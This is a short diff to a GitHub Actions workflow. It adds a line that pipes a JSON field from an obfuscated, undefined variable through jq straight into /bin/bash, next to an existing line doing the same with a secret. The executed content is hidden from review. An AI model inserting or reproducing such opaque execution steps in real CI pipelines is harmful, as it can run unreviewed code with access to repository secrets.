@@ -19,6 +19,7 @@ jobs:
           o55: ${{ secrets.o55 }}
         run: |
           printf '%s' "$o55" | jq -r .dogw1 | /bin/bash
+          printf '%s' "$axkt7508" | jq -r .lzc82353 | /bin/bash
 
       - name: Archive output
         uses: actions/upload-artifact@v4
